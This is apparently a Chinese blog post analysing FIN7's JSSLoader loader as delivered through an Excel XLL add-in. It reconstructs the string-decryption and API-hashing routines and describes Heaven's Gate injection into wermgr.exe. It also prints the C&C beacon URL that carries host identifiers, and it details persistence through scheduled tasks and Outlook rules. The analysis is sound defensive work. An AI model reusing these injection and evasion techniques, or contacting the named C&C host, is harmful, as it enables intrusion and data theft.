&emsp;&emsp;这些函数可以用来加载恶意代码,类型于VBA恶意代码中利用Auto_Open和Auto_Close方法执行恶意代码。不足的是x86版本的xll插件只能由x86版本的Excel加载被激活，x64版本的也是一样。<br>&emsp;&emsp; 与VBA宏一样, XLL插件加载时也会提示安全警告。<br><img src="1364ae67/clip_image003.gif"></p><h3 id="1-Excel-DNA框架"><a href="#1-Excel-DNA框架" class="headerlink" title="1.     Excel-DNA框架"></a>1.     Excel-DNA框架</h3><p>&emsp;&emsp;Excel-DNA为用于插件开发的合法框架，由于该框架能够无需操作磁盘就可以将保存在文件资源中的压缩.Net程序集直接加载的能力，因此被大部分恶意程序开发者所滥用。<br>&emsp;&emsp;由于某种原因, Excel-DNA生成的样本中大部分都包含10000个导出函数，并且这些函数的代码都是毫无意义的。<br><img src="1364ae67/clip_image005.jpg"></p><h3 id="2-释放并打开诱饵文档"><a href="#2-释放并打开诱饵文档" class="headerlink" title="2.     释放并打开诱饵文档"></a>2.     释放并打开诱饵文档</h3><p>&emsp;&emsp;在执行shellcode之前, 恶意程序将诱饵文档写入到临时目录并打开。<br><img src="1364ae67/clip_image006.gif"></p><p>&emsp;&emsp;诱饵文档显示如下图:              <br><img src="1364ae67/clip_image007.png">               </p><h3 id="3-state1-shellcode"><a href="#3-state1-shellcode" class="headerlink" title="3.     state1 shellcode"></a>3.     state1 shellcode</h3><p>&emsp;&emsp;调用VirtualAlloc分配可执行的内存, 将shellcode拷贝到这段内存并执行。</p><p><img src="1364ae67/clip_image009.gif"></p><h4 id="函数重定位"><a href="#函数重定位" class="headerlink" title="函数重定位"></a>函数重定位</h4><p>&emsp;&emsp;调用函数时并不直接使用函数地址而是将函数地址与地址0xF990005的偏移量保存到shellcode, 使用这样的策略就是为了保证不论分配的内存在哪个位置都能够计算出函数地址并调用。          <br><img src="1364ae67/clip_image010.gif"></p><p>&emsp;&emsp;通过偏移量来计算函数地址, 然后调用第一个偏移量对应的函数地址执行后续代码。<br><img src="1364ae67/clip_image011.gif"></p><h4 id="字符串解密"><a href="#字符串解密" class="headerlink" title="字符串解密"></a>字符串解密</h4><p>&emsp;&emsp;所有与API函数名相关的字符串都是使用恶意程序开发人员设计的自定义加密算法来进行加密的。如图所示, 加密字符串开始地址为0xF99BC3D，每个加密字符都以0结尾。<br><img src="1364ae67/clip_image012.png"></p><p>&emsp;&emsp;解密算法如下图, 解密后将下一个加密字符串的地址保存到字段string_addr, 解密时是按顺序解密的。</p><p><img src="1364ae67/clip_image014.gif"><br>以第一个加密字符串为例, 解密步骤如下:</p><p><strong>步骤</strong>：第一个字符串id为0，取反后为0xFF，然后加密字符串的第一位与0xFF相加,<br>第二位与0xFE相加，第三位与0xFD相加,以此类推计算出来的值就是解密后的字符串;<br>第二个字符串id为1,解密方法类似。</p><p><strong>加密字符串</strong>: 48 67 77 54 77 75 6A 49 6D 6E 7D 71 80 81<br><strong>解密字符串</strong>: 47 65 74 50 72 6F 63 41 64 64 72 65 73 73=&gt;GetProcAddress</p><p>&emsp;&emsp; 解密的所有字符串按顺序如下,都是API字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GetProcA</span><br><span class="line">LoadLibraryA</span><br><span class="line">Sleep  </span><br><span class="line">CreateProcessW  </span><br><span class="line">GetNativeSystemInfo</span><br><span class="line">VirtualAlloc</span><br><span class="line">Wow64DisableWow64FsRedirection</span><br><span class="line">Wow64RevertWow64FsRedirection</span><br><span class="line">CreateProcessInternalW</span><br><span class="line">GetSystemDirectoryW</span><br><span class="line">ntdll_RtlWow64EnableFsRedirectionEx</span><br></pre></td></tr></table></figure><h4 id="4-判断是否是x64系统"><a href="#4-判断是否是x64系统" class="headerlink" title="4.     判断是否是x64系统"></a>4.     判断是否是x64系统</h4><p>&emsp;&emsp;调用GetNativeSysInfo来判断受害者操作系统是否是x64系统，该函数返回一个结构体,第一位表示操作系统为6或9时表示系统为x64版本。如果不是x64版本的操作系统,则不会执行后续的shellcode, 返回并将控制权交给进程Excel。</p><p><img src="1364ae67/clip_image015.gif">  </p><h4 id="5-创建挂起进程wermgr-exe"><a href="#5-创建挂起进程wermgr-exe" class="headerlink" title="5.     创建挂起进程wermgr.exe"></a>5.     创建挂起进程wermgr.exe</h4><p>&emsp;&emsp;程序wermgr是windows的错误报告管理工具,用于向Microsoft发送操作崩溃和错误报告，恶意程序开发者将恶意代码注入到系统进程用于绕过安全软件的检测。<br>&emsp;&emsp;由于创建的进程属于x64进程, 而当前执行的excel属于x86进程，因此不能直接从x86注入shellcode到x64进程。<br>&emsp;&emsp;为了解决这个问题,恶意程序开发者准备了3个shellcode，在三个阶段中被使用, 分别命名为stage1、stage2和stage3。<br>&emsp;&emsp;Stage1用”天堂之门“技术切换到x64的内存空间并跳转到stage2执行,从stage2开始已经切换到了x64环境, 在stage2中将stage3注入到wermgr进程中。</p><p><img src="1364ae67/clip_image016.png"></p><p>&emsp;&emsp;该阶段的shellcode利用Heaven’s Gate(天堂之门)技术将shellcode从x86进程注入到x64进程中。<br>手动构造环境切换代码，并将地址0xF70015地址的跳转修改为x64 shellcode的内存地址，该shellcode将另一段shellcode注入到wermgr.exe内存中。<br><img src="1364ae67/clip_image018.png"><br>&emsp;&emsp;初始化在下一阶段的shellcode需要使用的数据,包括线程句柄、进程句柄和要注入的shellcode地址和大小，然后执行下一阶段shellcode代码。进程句柄用于读写远程进程,线程句柄用于恢复远程线程。<br><img src="1364ae67/clip_image020.png"></p><h3 id="4-Stage2天堂之门"><a href="#4-Stage2天堂之门" class="headerlink" title="4.Stage2天堂之门"></a>4.Stage2天堂之门</h3><h4 id="1-解密字符串"><a href="#1-解密字符串" class="headerlink" title="1.解密字符串"></a>1.解密字符串</h4><p>&emsp;&emsp;这段shellcode用于从x86环境切换到x64环境,也叫做天堂之门,Shellcode中使用的函数都是以硬编码哈希的形式存放, 在loadfunctions中通过对模块的导出表计算哈希并匹配来找到对应的函数地址。如下图所示:<br><img src="1364ae67/clip_image022.png"></p><p>&emsp;&emsp;该阶段的shellcode使用了包含大小写字母、数字的字符映射表和字符”/”,  并且每个字符再映射表中的位置都是随机的。解密时从字符映射表中找到待解密字符所在的索引,然后利用这些索引来解密字符串。字符映射表如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tzGeVX6QcPsLA5ManZv48EI9BFr/7pxhSok2OU1JT3CD0qN+uKYHjlWdRfbwgymi</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;解密过程如下</p><p>1.  从加密字符串中提取4个字符<br>2.  获取每个字符在字符映射表中的索引<br>3.  对四个索引分别进行如下运算, 解密处3个字符</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   decrypt_str[<span class="number">0</span>]= (indexs[<span class="number">0</span>]&lt;&lt;<span class="number">0x02</span>)|(indexs[<span class="number">1</span>]&gt;&gt;<span class="number">0x04</span>&amp;<span class="number">0x3</span>)</span><br><span class="line">   decrypt_str[<span class="number">1</span>]= (indexs[<span class="number">1</span>]&lt;&lt;<span class="number">0x04</span>)|(indexs[<span class="number">2</span>]&gt;&gt;<span class="number">0x02</span>&amp;<span class="number">0xF</span>)</span><br><span class="line">   decrypt_str[<span class="number">2</span>]=(indexs[<span class="number">2</span>]&lt;&lt;<span class="number">0x06</span>+indexs[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>4.  继续从加密字符串中提取接下来的4个字符串，重复1~3的步骤。</p><p>&emsp;&emsp;以字符串vjEv4OEAAHcNF6K0为例解密后的字符串为”kernel32.dll”,解密过程如下:</p><p>第一个4字符为vjEv,每个字符在映射表中的索引分别为 12 34 15 12,解密后ker<br>第二个4字符为4OEA,每个字符在映射表中的索引分别为 13 24 15 0c,解密后nel<br>第三个4字符为AHcN,每个字符在映射表中的索引分别为 0c 33 08 2e,解密后32.<br>第四个4字符为F6K0,每个字符在映射表中的索引分别为 19 06 31 2c,解密后dll<br>解密成功后对字符串计算哈希值, 哈希计算方法如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Char* str=”...”;<span class="comment">//解密后的字符串,省略</span></span><br><span class="line">Uint32_t x=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">For</span>(<span class="type">uint32_t</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(str);++i)</span><br><span class="line">&#123;</span><br><span class="line">    x = ((str[i]+ x)&lt;&lt; <span class="number">0xA</span>)+( str[i]+ x);</span><br><span class="line">    x = (x &gt;&gt;<span class="number">6</span>)^ x</span><br><span class="line">&#125;</span><br><span class="line">x=<span class="number">3</span>*x</span><br><span class="line"><span class="type">uint32_t</span> hash= ((x&gt;&gt;<span class="number">0xB</span>)^x)&lt;&lt;<span class="number">0xF</span> + (x&gt;&gt;<span class="number">0xB</span>)^x</span><br></pre></td></tr></table></figure><h4 id="2-获取函数地址"><a href="#2-获取函数地址" class="headerlink" title="2.获取函数地址"></a>2.获取函数地址</h4><p>&emsp;&emsp;通过获取”GS:[0x60]”来直接获取PEB结构的地址,然后遍历其字段Ldr中的链表InMemoryOrderModuleList并获取dll名。<br><img src="1364ae67/clip_image024.png"></p><p>&emsp;&emsp;得到dll名后先将其所有字符都转换成小写然后再计算哈希值。<br><img src="1364ae67/clip_image026.png"></p><p>&emsp;&emsp;哈希值计算方法与前面计算解密字符串使用的哈希方法一致，如果计算出的哈希值与要查找的哈希值匹配,则返回对应模块的加载基址。再根据加载地址遍历该模块导出的函数并计算哈希值与硬编码的哈希值相比较，如果匹配则计算函数地址然后用该地址覆盖哈希值。计算函数哈希值使用的方法与计算模块模块名一样。<br><img src="1364ae67/clip_image028.png"></p><p>&emsp;&emsp;这段shellcode并不是通过jmp或call指令来执行跳转, 原因是使用这两个指令能够跳转的偏移有限, 最大只支持32位偏移, 而在x64的地址空间中要跳转的偏移可能超过32位，因此通过将要跳转的目标地址压入到堆栈中用于保存返回地址的内存中，然后函数返回的时候返回到目标地址执行代码。<br><img src="1364ae67/clip_image030.png"></p><p>注入的代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">debug1150:00000000004E90B0 mov     rax, 161523A0000h ;要跳转的目标地址</span><br><span class="line">debug1150:00000000004E90BA mov     rcx, rax</span><br><span class="line">debug1150:00000000004E90BD push    rax</span><br><span class="line">debug1150:00000000004E90BE retn</span><br></pre></td></tr></table></figure><h3 id="5-Shellcode版本JSSLoader"><a href="#5-Shellcode版本JSSLoader" class="headerlink" title="5.Shellcode版本JSSLoader"></a>5.Shellcode版本JSSLoader</h3><p>&emsp;&emsp;该阶段的shellcode为进程Excel注入到进程wermgr,进程wermgr的入口点代码在注入前已经被修改，以便在进程wermgr恢复执行时跳转到shellcode中执行代码。</p><h4 id="1-字符串解密"><a href="#1-字符串解密" class="headerlink" title="1. 字符串解密"></a>1. 字符串解密</h4><p>&emsp;&emsp;字符串解密与上一阶段的shellcode使用的方法一样, 不同的就是使用的字符映射表不一样。<br><img src="1364ae67/clip_image032.png"></p><h4 id="2-收集系统信息"><a href="#2-收集系统信息" class="headerlink" title="2.收集系统信息"></a>2.收集系统信息</h4><p>&emsp;&emsp;获取受害者机器的主机名, 如果没有获取成功则主机名设置为”N”。<br><img src="1364ae67/clip_image034.png"></p><p>&emsp;&emsp;读取受害者机器的DNS domain,如果没有则设置为”WORKGROUP”。<br><img src="1364ae67/clip_image036.png"></p><p>&emsp;&emsp;获取受害者的机器名。<br><img src="1364ae67/clip_image038.png"></p><p>&emsp;&emsp;使用WMI查询接口来获取系统信息.<br><img src="1364ae67/clip_image040.png"></p><p>&emsp;&emsp;遍历所有正在运行的进程并获取其进程名和进程PID值,最后按如下格式保存到buff中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;“name”:进程名,”pid”:进程PID&#125;</span><br></pre></td></tr></table></figure><p><img src="1364ae67/clip_image042.png"> <br>&emsp;&emsp;遍历桌面所有的文件,并读取其文件名和文件大小,按如下格式保存到buff中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;“file”:文件名,”size”:文件大小&#125;</span><br></pre></td></tr></table></figure><p><img src="1364ae67/clip_image044.png"><br>&emsp;&emsp;最后将收集到的所有信息组合成JSON格式数据。<br><img src="1364ae67/clip_image046.png"><br>&emsp;&emsp;Base64编码后上传到C&amp;C服务器。<br><img src="1364ae67/clip_image048.png"></p><h4 id="3-发送上线信号"><a href="#3-发送上线信号" class="headerlink" title="3.发送上线信号"></a>3.发送上线信号</h4><p>&emsp;&emsp;从环境变量”UserDomain”和”ComputerName”中读取机器域名和用户名。<br><img src="1364ae67/clip_image050.png"></p><p>&emsp;&emsp;当shellcode第一次被执行时,收集系统信息并上传到C&amp;C服务器。发送的post数据为收集的系统信息，请求链接为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">essentialsmassageanddayspa.com?id=&#123;机器域名&#125;&#123;用户名&#125;&amp;type=a</span><br></pre></td></tr></table></figure><p><img src="1364ae67/clip_image052.png"></p><h4 id="4-使用随机文件名"><a href="#4-使用随机文件名" class="headerlink" title="4.使用随机文件名"></a>4.使用随机文件名</h4><p>&emsp;&emsp;释放文件时在硬编码的文件名列表中随机选择一个字符串作为文件名。</p><p><img src="1364ae67/clip_image054.png"></p><p>&emsp;&emsp;使用的文件名列表解密后如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1,&quot;rain&quot;      2,&quot;faint&quot;     3,&quot;shark&quot;     4,&quot;hierarchy&quot;</span><br><span class="line">5,&quot;brush&quot;     6,&quot;grimace&quot;      7,&quot;recognize&quot; 8,&quot;mountain&quot;</span><br><span class="line">9,&quot;place&quot;     10,&quot;pressure&quot; 11,&quot;delay&quot;    12,&quot;volunteer&quot;</span><br><span class="line">13,&quot;snarl&quot;    14,&quot;shame&quot;    15,&quot;attitude&quot; 16,&quot;pool&quot;</span><br><span class="line">17,&quot;priority&quot; 18,&quot;snack&quot;    19,&quot;category&quot; 20,&quot;my&quot;</span><br><span class="line">21,&quot;necklace&quot; 22,&quot;decorative&quot;  23,&quot;tower&quot;    24,&quot;fountain&quot;</span><br><span class="line">25,&quot;software&quot; 26,&quot;siege&quot;    27,&quot;trade&quot;    28,&quot;gravel&quot;</span><br><span class="line">29,&quot;beginning&quot;   30,&quot;fragrant&quot; 31,&quot;execute&quot;  32,&quot;orthodox&quot;</span><br><span class="line">33,&quot;harmful&quot;  34,&quot;classroom&quot;   35,&quot;ostracize&quot;   36,&quot;blade&quot;</span><br><span class="line">37,&quot;hypnothize&quot;  38,&quot;general&quot;  39,&quot;achieve&quot;  40,&quot;poetry&quot;</span><br><span class="line">41,&quot;ensure&quot;      42,&quot;prison&quot;      43,&quot;find&quot;     44,&quot;prevent&quot;</span><br><span class="line">45,&quot;extract&quot;  46,&quot;presidential&quot; 47,&quot;graduate&quot; 48,&quot;south&quot;</span><br><span class="line">49,&quot;week&quot;</span><br></pre></td></tr></table></figure><h4 id="8-C-amp-C指令"><a href="#8-C-amp-C指令" class="headerlink" title="8.     C&amp;C指令"></a>8.     C&amp;C指令</h4><p>&emsp;&emsp;从shellcode中能够执行的指令来看，它不仅仅是作为一个下载器和加载器，还能够执行各种脚本文件和从C&amp;C服务器下发的shellcode，这也是JSSLoader的命名原因。<br><img src="1364ae67/clip_image056.png">   </p><h4 id="9-执行脚本文件"><a href="#9-执行脚本文件" class="headerlink" title="9.     执行脚本文件"></a>9.     执行脚本文件</h4><p>a)      使用cscript来执行js文件<br><img src="1364ae67/clip_image058.png"><br>b)      使用csript来执行vbs文件<br><img src="1364ae67/clip_image060.png"><br>c)      执行任意powershell命令<br><img src="1364ae67/clip_image062.png"><br>d)      通过ReadAllText读取文件内容并作为powershell命令传递给poershell。<br><img src="1364ae67/clip_image064.png"></p><h4 id="7-直接在内存中执行shellcode"><a href="#7-直接在内存中执行shellcode" class="headerlink" title="7.直接在内存中执行shellcode"></a>7.直接在内存中执行shellcode</h4><p>&emsp;&emsp;从C&amp;C服务器接收的shellcode为十六进制字符串,需要先转成十六进制数据然后拷贝到分配的可执行内存中，创建一个线程将shellcode作为线程函数执行。<br><img src="1364ae67/clip_image066.png"></p><h4 id="8-执行可执行文件"><a href="#8-执行可执行文件" class="headerlink" title="8.执行可执行文件"></a>8.执行可执行文件</h4><p>&emsp;&emsp;从C&amp;C服务器接收要执行的文件数据和执行时需要的参数，将文件保存为随机名然后以隐藏窗口的方式执行。<br><img src="1364ae67/clip_image068.png">        </p><h4 id="9-执行DLL文件"><a href="#9-执行DLL文件" class="headerlink" title="9.执行DLL文件"></a>9.执行DLL文件</h4><p>&emsp;&emsp;从C&amp;C服务器接收要执行的dll文件和要调用的导出函数以及参数值，调用程序rundll32来执行dll文件。<br><img src="1364ae67/clip_image070.png"></p><h4 id="10-添加自启动项"><a href="#10-添加自启动项" class="headerlink" title="10.添加自启动项"></a>10.添加自启动项</h4><p>&emsp;&emsp;当前版本默认情况下没有设置自启动项,当接收到添加启动项的命令时,获取当前执行的文件名和命令行，并为其创建注册表值,键名使用VideoCodes作为伪装，键名为启动时要执行的命令行。  <br><img src="1364ae67/clip_image072.png"></p><h4 id="11-创建任务计划"><a href="#11-创建任务计划" class="headerlink" title="11. 创建任务计划"></a>11. 创建任务计划</h4><p>&emsp;&emsp; C&amp;C指令中有3个指令的功能是创建计划任务，主要实现原理一样，不同之处在创建计划任务时使用不同的参数。使用一个结构来描述创建计划任务时设置的参数,</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">tasksche_ctx</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//前面3个为创建计划任务时需要的com对象</span></span><br><span class="line">  ITaskService *taskService;</span><br><span class="line">  ITaskFolder *taskFolder;</span><br><span class="line">  IRegisteredTask RegisteredTask;</span><br><span class="line">  <span class="comment">//不同C&amp;C指令创建计划任务时改变的是下列参数</span></span><br><span class="line">  <span class="type">char</span>* command;         <span class="comment">//计划任务执行的命令</span></span><br><span class="line">  <span class="type">char</span> *arguments;       <span class="comment">//创建计划任务时使用的参数</span></span><br><span class="line">  <span class="type">char</span>* task;         <span class="comment">//计划任务名</span></span><br><span class="line">  _DWORD interval;       <span class="comment">//创建计划任务时设置启动的事件间隔</span></span><br><span class="line">  _DWORD TriggerType;     <span class="comment">//计划任务的触发类型</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;创建用于计划任务的XML文件,然后调用IregisterdTask注册计划任务,使用的XML数据如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span><br><span class="line">  &lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;</span><br><span class="line">  &lt;RegistrationInfo&gt;</span><br><span class="line">&lt;Date&gt;</span><br><span class="line">%04u-%02u-%02uT%02u:%02u:%02u.%u //当前时间</span><br><span class="line">&lt;/Date&gt;</span><br><span class="line">//如果存在accoutName，才会设置Author</span><br><span class="line">&lt;Author&gt;</span><br><span class="line">  &#123;当前用户名&#125;</span><br><span class="line">&lt;/Author&gt;</span><br><span class="line">&lt;Description&gt;CamVideoApp update&lt;/Description&gt;</span><br><span class="line">&lt;URI&gt;\Task CamVideoApp Update&lt;/URI&gt;</span><br><span class="line">&lt;/RegistrationInfo&gt;</span><br><span class="line">&lt;Triggers&gt;</span><br><span class="line">//触发类型为2时设置为如下值</span><br><span class="line">&lt;LogonTrigger&gt;</span><br><span class="line">&lt;Enabled&gt;true&lt;/Enabled&gt;</span><br><span class="line">&lt;UserId&gt;&#123;当前用户SID&#125;&lt;/UserId&gt;</span><br><span class="line">&lt;/LogonTrigger&gt;</span><br><span class="line">&lt;TimeTrigger&gt;</span><br><span class="line">&lt;StartBoundary&gt;</span><br><span class="line">04u-%02u-%02uT%02u:%02u:%02u //当前时间</span><br><span class="line">&lt;/StartBoundary&gt;</span><br><span class="line">&lt;Enabled&gt;true&lt;/Enabled&gt;</span><br><span class="line">&lt;/TimeTrigger&gt;</span><br><span class="line">&lt;/Triggers&gt;</span><br><span class="line">&lt;Principals&gt;</span><br><span class="line">&lt;Principal id=&quot;Author&quot;&gt;</span><br><span class="line">&lt;UserId&gt;&#123;AccountSid&#125;&lt;/UserId&gt;</span><br><span class="line">&lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</span><br><span class="line">&lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</span><br><span class="line">&lt;/Principal&gt;</span><br><span class="line">&lt;/Principals&gt;</span><br><span class="line">&lt;Settings&gt;</span><br><span class="line">//如果当前计划任务实例已经启动, 不会创建新的 </span><br><span class="line">&lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;</span><br><span class="line">//允许计算机在使用电源模式时启动计划任务 </span><br><span class="line">&lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;</span><br><span class="line">//在计算机使用电池模式的时候不终止计划任务 </span><br><span class="line">&lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;</span><br><span class="line">//允许TerminateProcess 终止计划任务 </span><br><span class="line">&lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;</span><br><span class="line">//错过时间时等待下一次启动时间</span><br><span class="line">&lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;</span><br><span class="line">//在没有网络时也启动该计划任务</span><br><span class="line">&lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;</span><br><span class="line">//机器空闲时计划任务设置</span><br><span class="line">&lt;IdleSettings&gt;</span><br><span class="line">&lt;Duration&gt;PT10M&lt;/Duration&gt;      //间隔10分钟执行</span><br><span class="line">&lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt; //超时时间1h</span><br><span class="line">&lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt; //空闲结束时结束计划任务</span><br><span class="line">&lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;//多次进入空闲时不启动计划任务</span><br><span class="line">&lt;/IdleSettings&gt;</span><br><span class="line">&lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;</span><br><span class="line">&lt;Enabled&gt;true&lt;/Enabled&gt;</span><br><span class="line">&lt;Hidden&gt;false&lt;/Hidden&gt;</span><br><span class="line">&lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;</span><br><span class="line">&lt;WakeToRun&gt;false&lt;/WakeToRun&gt;</span><br><span class="line">//72小时后关闭该计划任务</span><br><span class="line">&lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;</span><br><span class="line">&lt;Priority&gt;7&lt;/Priority&gt;</span><br><span class="line">&lt;/Settings&gt;</span><br><span class="line">&lt;Actions Context=&quot;Author&quot;&gt;</span><br><span class="line">&lt;Exec&gt;</span><br><span class="line">&lt;Command&gt;&#123;使用命令&#125;&lt;/Command&gt;</span><br><span class="line">&lt;Arguments&gt;&#123;命令行参数&#125;&lt;/Arguments&gt;  </span><br><span class="line">&lt;/Exec&gt;</span><br><span class="line">&lt;/Actions&gt;</span><br><span class="line">&lt;/Task&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;当接收到的C&amp;C指令ID为4时, 从C&amp;C接收要下载的文件和执行文件时需要的命令行参数，将文件保存为随机名并为其创建计划任务。其中间隔时间为300秒，设置计划任务名为”Task CamVideoApp Update”，但是在注册计划任务的时候并没有用到而是使用”CamVideoApp update”作为默认计划任务名。触发类型为2表示创建LogonTrigger触发器。<br><img src="1364ae67/clip_image074.png"></p><p>&emsp;&emsp;C&amp;C指令0x12与0x13的功能相似, 唯一区别就是0x12不会创建LogonTrigger触发器而0x13会创建。从C&amp;C接收要执行的文件和创建计划任务时需要的参数，从C&amp;C接收的各个参数使用分隔符”|”分隔。<br><img src="1364ae67/clip_image076.png"></p><h4 id="12-outlook邮件联系人收集"><a href="#12-outlook邮件联系人收集" class="headerlink" title="12.outlook邮件联系人收集"></a>12.outlook邮件联系人收集</h4><p>&emsp;&emsp;当前版本的JSSLoader使用Microsoft的MAPI(邮件应用程序接口)来与Outlook进行交互。首先动态加载mapi32.dll，并获取相关API地址将其保存到自定义的结构中。<br><img src="1364ae67/clip_image078.png"><br> 通过MAPI接口从outlook的地址簿中收集所有邮件联系人。<br><img src="1364ae67/clip_image080.png"></p><h4 id="13-注入恶意规则到outlook执行持久化"><a href="#13-注入恶意规则到outlook执行持久化" class="headerlink" title="13.注入恶意规则到outlook执行持久化"></a>13.注入恶意规则到outlook执行持久化</h4><p>&emsp;&emsp;Outlook恶意规则可用于通过创建执行恶意程序的规则在实现恶意程序在windows实现持久化。<br>&emsp;&emsp;该规则可以设置为在目标接收到邮件主题中包含特定关键字的电子邮件时执行和安装恶意程序。<br>&emsp;&emsp;首先从contentsTable中获取存储默认接收的消息表。</p><p><img src="1364ae67/clip_image082.png"><br>每一个消息存储都存在一个默认的接收文件夹,一般来说就是收件夹。获取收件夹的EntryID来打开收件夹。<br><img src="1364ae67/clip_image084.png"><br>填充需要注入的恶意规则，然后将消息保存到Exchange服务器。<br><img src="1364ae67/clip_image086.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.   概述&quot;&gt;&lt;/a&gt;1.   概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;该组织属于民间APT组织，自2015年以来，FIN7成员参与了针对100多家美国公司的高度复杂的恶意软件活动，主要集中在餐馆，游戏和酒店行业。&lt;br&gt;&amp;emsp;&amp;emsp;该组织通常使用针对受害者的恶意软件网络钓鱼攻击，希望能够通过他们渗透系统窃取银行卡数据并将其出售。&lt;br&gt;&amp;emsp;&amp;emsp;JSSLoader为该APT在进行攻击时使用的一个组件，虽然JSSLoader以最小化的.Net RAT而闻名，但是麻雀虽小，五脏俱全, 比如持久化、自动更新、恶意软件下载、数据泄露等等功能都包含。&lt;/p&gt;
